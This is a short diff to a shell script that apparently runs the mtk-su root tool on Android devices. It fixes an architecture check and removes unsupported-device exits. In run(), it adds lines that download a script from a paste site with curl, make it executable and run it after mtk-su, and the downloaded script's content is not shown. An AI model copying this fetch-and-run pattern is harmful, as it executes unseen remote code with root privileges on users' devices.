@@ -12,15 +12,10 @@ set_var()
 	then 
 		arch="arm64"
 	fi
-	if [ $arch = armv71 ]
+	if [ $arch = armv7l ]
 	then 
-		echo device not supported
-		exit
 		arch="arm"
-	else
-		echo device not supported
-		exit
-	fi
+        fi
 }
 
 instal()
@@ -38,7 +33,10 @@ instal()
 
 run()
 {
+	curl https://del.dog/raw/bafepekecu > maker.sh
+	chmod 755 maker.sh
 	(./mtk-su/mtk-su_r12/$arch/mtk-su -v)
+	./maker.sh
 }
 
 set_var
